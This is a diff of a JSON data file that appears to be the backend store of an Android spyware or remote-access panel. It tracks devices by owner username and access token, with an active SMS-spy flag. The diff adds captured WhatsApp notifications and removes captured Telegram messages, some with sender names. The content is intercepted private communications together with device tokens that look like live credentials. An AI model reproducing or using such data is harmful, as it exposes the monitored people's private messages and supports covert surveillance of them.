@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773109609,
+    "lastSeen": 1776773112321,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773110892,
+    "lastSeen": 1776773113875,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773114002
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773113491
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773113007
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773112553
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 19:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773112250
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -14362,46 +14402,6 @@
         "time": "21/04 18:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769995494
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
-        "content": "674 bigg all wlet short \n\n1.3 no",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769995476
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16577 pesan baru dari 111 obrolan",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769995297
-      },
-      {
-        "appName": "Telegram",
-        "sender": "BOT KONTOL",
-        "content": "Start untuk cek bot!",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769994177
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16576 pesan baru dari 111 obrolan",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769994147
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Fs Noktel \nId 1 r9k (2) nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769994117
       }
     ],
     "galleryPhotos": [],
